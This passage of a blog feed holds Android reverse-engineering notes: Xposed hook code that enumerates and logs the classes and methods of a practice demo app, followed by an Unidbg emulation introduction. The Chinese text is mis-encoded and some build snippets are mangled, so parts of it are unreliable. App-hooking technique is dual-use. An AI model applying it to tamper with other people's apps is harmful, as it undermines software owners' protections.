class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>getDeclaredMethods()ï¼šè·å¾—æ‰€æœ‰æ–¹æ³•ï¼Œè¿”å›å€¼æ˜¯Method[]</li><li>getDeclaredFields()ï¼šè·å¾—æ‰€æœ‰å±æ€§ï¼Œè¿”å›å€¼æ˜¯Field[]</li></ul><h3 id="æ‰§è¡Œç»“æœ-11">æ‰§è¡Œç»“æœ</h3><p>è¿è¡Œdemo<br><img src="/posts/947764cb.htm/image-20230716190331913.png" alt="image-20230716190331913"></p><h2 id="åä¸‰-éå†æ‰€æœ‰å†…éƒ¨ç±»">åä¸‰.éå†æ‰€æœ‰å†…éƒ¨ç±»</h2><h3 id="ç›®æ ‡ï¼šéå†æ‰€æœ‰å†…éƒ¨ç±»">ç›®æ ‡ï¼šéå†æ‰€æœ‰å†…éƒ¨ç±»</h3><h3 id="ä»£ç å®ç°å¦‚ä¸‹-12">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        Method[] md=clazz.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;md.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,md[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">        Field[] fd=clazz.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;fd.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,fd[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;=======================&quot;</span>);</span><br><span class="line">        Class[] cls=clazz.getDeclaredClasses();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;cls.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,cls[i].getName());</span><br><span class="line">            Method[] mds=cls[i].getDeclaredMethods();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;mds.length;j++)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,mds[j].toString());</span><br><span class="line">            &#125;</span><br><span class="line">            Field[] fds=cls[i].getDeclaredFields();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;fds.length;j++)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,fds[j].toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ä¸€ä¸ªå¾ªç¯éå†ï¼Œå¤–å±‚æ˜¯éå†classesï¼Œå†…å±‚è¾“å‡ºæ¯ä¸€ä¸ªå†…éƒ¨ç±»çš„methodsä¸fields</p><h3 id="æ‰§è¡Œç»“æœ-12">æ‰§è¡Œç»“æœ</h3><p>è¿è¡Œdemo<br><img src="/posts/947764cb.htm/image-20230716210145966.png" alt="image-20230716210145966"></p><h2 id="åå››-éå†æ‰€æœ‰ç±»">åå››.éå†æ‰€æœ‰ç±»</h2><h3 id="ç›®æ ‡ï¼šéå†æ‰€æœ‰ç±»">ç›®æ ‡ï¼šéå†æ‰€æœ‰ç±»</h3><h3 id="ä»£ç å®ç°å¦‚ä¸‹-13">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        XposedHelpers.findAndHookMethod(ClassLoader.class, <span class="string">&quot;loadClass&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Class clazz1=(Class)param.getResult();</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;LoadClass: &quot;</span>+clazz1.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦ä½¿ç”¨ClassLoaderçš„loadClassæ–¹æ³•ï¼ŒæŠŠæŠ½è±¡ç±»ClassLoaderå­—èŠ‚åŒ–ï¼Œè°ƒç”¨ä¸‹é¢çš„loadClassæ–¹æ³•</p><ul><li>param.getResult()è·å¾—ç»“æœï¼Œå³åŠ è½½ç±»</li><li>clazz1.getName()ï¼šè·å¾—åŠ è½½ç±»çš„åå­—</li></ul><h3 id="æ‰§è¡Œç»“æœ-13">æ‰§è¡Œç»“æœ</h3><p>æ‰“å¼€demo<br><img src="/posts/947764cb.htm/image-20230716221001521.png" alt="image-20230716221001521"></p><h2 id="åäº”-Hookæ‰€æœ‰ç±»çš„æ‰€æœ‰æ–¹æ³•">åäº”.Hookæ‰€æœ‰ç±»çš„æ‰€æœ‰æ–¹æ³•</h2><h3 id="ç›®æ ‡ï¼šHookæ‰€æœ‰ç±»çš„æ‰€æœ‰æ–¹æ³•">ç›®æ ‡ï¼šHookæ‰€æœ‰ç±»çš„æ‰€æœ‰æ–¹æ³•</h3><h3 id="ä»£ç å®ç°å¦‚ä¸‹-14">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        XposedHelpers.findAndHookMethod(ClassLoader.class, <span class="string">&quot;loadClass&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Class clazz=(Class)param.getResult();</span><br><span class="line">                String clazzName=clazz.getName();</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;LoadClass: &quot;</span>+clazzName);   <span class="comment">//è¾“å‡ºç±»å</span></span><br><span class="line">                <span class="keyword">if</span> (clazzName.contains(<span class="string">&quot;com.xiaojianbang&quot;</span>))&#123;    <span class="comment">//è¿‡æ»¤</span></span><br><span class="line">                    Method[] mds=clazz.getDeclaredMethods();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> i= <span class="number">0</span>; i &lt; mds.length; i++) &#123;</span><br><span class="line">                        <span class="keyword">final</span> Method md=mds[i];</span><br><span class="line">                        <span class="type">int</span> mod=mds[i].getModifiers();     <span class="comment">//è·å¾—è¿™ä¸ªæ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦</span></span><br><span class="line">                        <span class="keyword">if</span>(!Modifier.isAbstract(mod)       <span class="comment">//ä¸æ˜¯æŠ½è±¡æ–¹æ³•</span></span><br><span class="line">                           &amp;&amp; !Modifier.isNative(mod)      <span class="comment">//ä¸æ˜¯nativeæ–¹æ³•</span></span><br><span class="line">                           &amp;&amp; !Modifier.isInterface(mod))&#123; <span class="comment">//ä¸æ˜¯æ¥å£</span></span><br><span class="line">                            XposedBridge.hookMethod(mds[i], <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;ï¼Ÿã€hookä»–</span><br><span class="line">                                <span class="meta">@Override</span></span><br><span class="line">                                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                                    <span class="keyword">if</span>(md.getName().contains(<span class="string">&quot;complexParameterFunc&quot;</span>))&#123;</span><br><span class="line">                                        <span class="type">int</span> paramNum=param.args.length;  <span class="comment">//å‚æ•°é•¿åº¦</span></span><br><span class="line">                                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;paramNum ; i++) &#123;</span><br><span class="line">                                            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,param.args[i].getClass().getName());</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hook Method: &quot;</span>+md.toString());</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ‰§è¡Œç»“æœ-14">æ‰§è¡Œç»“æœ</h3><p>è¿è¡Œdemoï¼Œæˆ‘å¹¶æ²¡æœ‰è¿è¡Œå‡ºcomplexParameterFuncæ–¹æ³•çš„å‚æ•°å•¥çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</p><p><img src="/posts/947764cb.htm/image-20230717111721593.png" alt="image-20230717111721593"></p><p>æŒ‰é“ç†åº”è¯¥ä¹Ÿä¼šè¾“å‡ºè¿™ä¸ªå¦‚ä¸‹<img src="/posts/947764cb.htm/image-20230717111832540.png" alt="image-20230717111832540"></p><h2 id="åå…­-Hookå¤šdex">åå…­.Hookå¤šdex</h2><h2 id="ä¸€äº›è¡¥å……">ä¸€äº›è¡¥å……</h2><h3 id="è¿‡æ»¤å­è¿›ç¨‹">è¿‡æ»¤å­è¿›ç¨‹</h3><p><code>LoadPackageParam.processName</code></p><h3 id="è·å¾—Context">è·å¾—Context</h3><p><code>Context context = AndroidAppHelper.currentApplication();</code></p><h3 id="è·å–å¯¹è±¡">è·å–å¯¹è±¡</h3><ul><li><p>hookçš„æ–¹å¼ ==ã€‹ params.thisobject</p></li><li><p>Class clazz=XposedHelpers.findClass(classname,loadPackageParam.classLoader);<br>Object obj=XposedHelpers.newInstance(clazz);<br>XposedHelpers.callMethod(obj,methodname);</p></li><li><p>Constructor cons = XposedHelpers.findConstructorExact(classname,loadPackageParam.classLoader)<br>Object obj = cons.newInstance();<br>XposedHelpers.callMethod(obj,methodname);</p></li><li><pre><code class="language-java">XposedBridge.hookAllMethod(clazz,Methodname,new XC_MethodHook()&#123;protected void afterHookedMethod(MethodHookParam param) throws Throwable&#123;        super.afterHookedMethod(param);        Object obj=param.thisObject;        XposedHelpers.callMethod(obj,methodname,args);&#125;&#125;)</code></pre></li><li></li></ul>]]></content>
    
    
    <summary type="html">ğŸ•Xposed Hookæ¡†æ¶çš„åŸºæœ¬æ“ä½œæ•´ç†ä¸å½’çº³</summary>
    
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/categories/Android%E9%80%86%E5%90%91/"/>
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
    <category term="hook" scheme="https://zxk1ng.github.io/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>Unidbg</title>
    <link href="https://zxk1ng.github.io/posts/466ed760.html"/>
    <id>https://zxk1ng.github.io/posts/466ed760.html</id>
    <published>2025-01-15T07:04:22.000Z</published>
    <updated>2025-01-15T07:14:39.058Z</updated>
    
    <content type="html"><![CDATA[<h1>Unidbg</h1><h2 id="Capstone-Unicorn-Keystone">Capstone Unicorn Keystone</h2><p>Capstone åæ±‡ç¼–æ¡†æ¶</p><p>Unicorn CPUæ¨¡æ‹Ÿæ‰§è¡Œæ¡†æ¶</p><ul><li>å¥½æ¯”ä¸€ä¸ªcpu æ¨¡æ‹Ÿæ‰§è¡Œå„ç§æŒ‡ä»¤ æä¾›äº†ç¼–ç¨‹è¯­è¨€æ¥å£ï¼Œå¯ä»¥æ“ä½œå†…å­˜ï¼Œå¯„å­˜å™¨ï¼Œä½†å®ƒä¸æ˜¯ä¸€ä¸ªç³»ç»Ÿï¼Œå†…å­˜ç®¡ç†ï¼Œæ–‡ä»¶ç³»ç»Ÿï¼Œç³»ç»Ÿè°ƒç”¨ç­‰éƒ½éœ€è¦è‡ªå·±å®ç°</li></ul><p>Keystone æ±‡ç¼–æ¡†æ¶</p><p><strong>Ubuntuå®‰è£…ä¸‰ä¸ªæ¡†æ¶</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®‰è£…capstone</span></span><br><span class="line">pip install capstone</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®‰è£…Unicorn</span></span><br><span class="line">pip install Unicorn</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®‰è£…Keystone</span></span><br><span class="line">pip install keystone<span class="punctuation">-</span>engine</span><br></pre></td></tr></table></figure><h2 id="ä¸€äº›åŸºæœ¬ä½¿ç”¨">ä¸€äº›åŸºæœ¬ä½¿ç”¨</h2><h3 id="Unidbgç®€å•ä»‹ç»">Unidbgç®€å•ä»‹ç»</h3><ul><li>æ”¯æŒå¯¹soçš„åŠ è½½</li><li>æ”¯æŒå¯¹jniæ¥å£å‡½æ•°çš„æ¨¡æ‹Ÿè°ƒç”¨</li><li>æ”¯æŒå¸¸è§çš„syscallsçš„æ¨¡æ‹Ÿè°ƒç”¨</li><li>æ”¯æŒarm32å’Œarm64</li><li>æ”¯æŒandroidå’ŒIOS</li><li>åŸºäºHookZzå®ç°çš„inline hookï¼Œxhookå®ç°çš„hookï¼ŒIOS fishhookï¼Œsubstrateï¼Œwhale hookç­‰ ä»¥åŠæ”¯æŒgdbï¼Œidaè¿œç¨‹è°ƒå¼ç­‰é«˜çº§åŠŸèƒ½</li><li>æ”¯æŒDynarmicï¼Œ</li><li>æ”¯æŒåŸºäºDobbyçš„Inline hook åŸºäºxHookçš„GOT hook</li></ul><p>é©±åŠ¨unidbgçš„åº•å±‚å¼•æ“ï¼šDynarmic(æ•ˆç‡æ›´é«˜) Unicorn</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¯ç”¨Dynarmicå¼•æ“ ï¼Œæ³¨é‡Šé»˜è®¤unicorn</span></span><br><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">        DynarmicLoader.useDynarmic();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="unidbgç¤ºä¾‹è®²è§£">unidbgç¤ºä¾‹è®²è§£</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">emulator = AndroidEmulatorBuilder   <span class="comment">//æ„å»ºæ¨¡æ‹Ÿå™¨å®ä¾‹</span></span><br><span class="line">                .for32Bit()</span><br><span class="line">                <span class="comment">//æ·»åŠ DynarmicFactoryåç«¯å·¥å‚ï¼Œä¸ºtrueå«ä¹‰ï¼šå¦‚æœå‡ºç°é—®é¢˜ é€€å›Unicornå·¥å‚</span></span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> <span class="title class_">DynarmicFactory</span>(<span class="literal">true</span>))</span><br><span class="line">                .build();</span><br><span class="line"><span class="comment">//åç«¯å·¥å‚é™¤äº†DynarmicFactory è¿˜æ”¯æŒhypervisorï¼ŒKVMï¼ŒUnicorn2ï¼ŒåŠé»˜è®¤çš„Unicorn</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//loadlibraryä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯soçš„è·¯å¾„ï¼Œç¬¬äºŒä¸ªæ˜¯ æ˜¯å¦è‡ªåŠ¨æ‰§è¡Œinitå‡½æ•°</span></span><br><span class="line"><span class="type">DalvikModule</span> <span class="variable">dm</span> <span class="operator">=</span> vm.loadLibrary(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;so_path&quot;</span>), <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è„±ç¦»ç¼–è¯‘å™¨ï¼Œä½¿ç”¨å‘½ä»¤è¡Œç¼–è¯‘so">è„±ç¦»ç¼–è¯‘å™¨ï¼Œä½¿ç”¨å‘½ä»¤è¡Œç¼–è¯‘so</h3><ul><li><p>test/java/com/è‡ªå®šä¹‰åŒ…è·¯å¾„ä¸‹ç¼–å†™MainActivity.javaç­‰ä»£ç ï¼Œç„¶ååŒ…è·¯å¾„ä¸‹åˆ›å»ºbuildæ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜æ”¾soæºä»£ç ä¸é…ç½®æ–‡ä»¶</p></li><li><p>å°†cppæ–‡ä»¶ä¸CMakeLists.txtæ”¾åˆ°buildæ–‡ä»¶å¤¹ä¸‹</p></li><li><p>å°†androidstudioä¸­çš„cmakeè·¯å¾„æ·»åŠ åˆ°ç¯å¢ƒå˜é‡</p></li><li><p>åœ¨buildä¸‹åˆ›å»ºbuild.shæ–‡ä»¶ï¼Œç¼–å†™å¦‚ä¸‹å†…å®¹</p></li><li><pre><code>cmake \-H ./ \-B ./ninja \-DANDROID_ABI=armeabi-v7a \       //æˆ–arm64-v8a-DANDROID_PLATFORM=android-23 \   //android-16-DANDROID_NDK=/root/Android/Sdk/ndk/xx.xx.x \-DCMAKE_TOOLCHAIN_FILE=/root/Android/Sdk/ndk/xx.xx.x/build/cmake/android.toolchain.cmake \-G Ninjaninja -C ./ninja<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>ä¿®æ”¹CMakeLists.txtæ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®</span><br><span class="line"></span><br></pre></td></tr></table></figure>ser(CMAKE_LIBRARY_OUTPUT_DIRECTORY $&#123;PROJECT_SOURCE_DIR&#125;/ ../)set(CMAKE_BUILD_TYPE &quot;Release&quot;)set(CMAKE_C_FLAGS_RELEASE &quot;$&#123;CMAKE_C_FLAGS_RELEASE&#125; -s&quot;)set(CMAKE_CXX_FLAGS_RELEASE &quot;$&#123;CMAKE_CXX_FLAGS_RELEASE&#125; -s&quot;)<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- è¿è¡Œbuild.shå‘½ä»¤ ç”Ÿæˆsoåˆ™æˆåŠŸ</span><br><span class="line"></span><br><span class="line"><span class="comment">## Unidbgå…¥é—¨åŸºç¡€æ¡†æ¶</span></span><br><span class="line"></span><br><span class="line">1. **callStaticJniMethodObject**</span><br><span class="line">   æ¯”callFunctionå¤šå°è£…äº†ä¸€äº›ä»£ç  ä¸éœ€è¦è‡ªå·±å¯»æ‰¾å‡½æ•°åœ°å€ 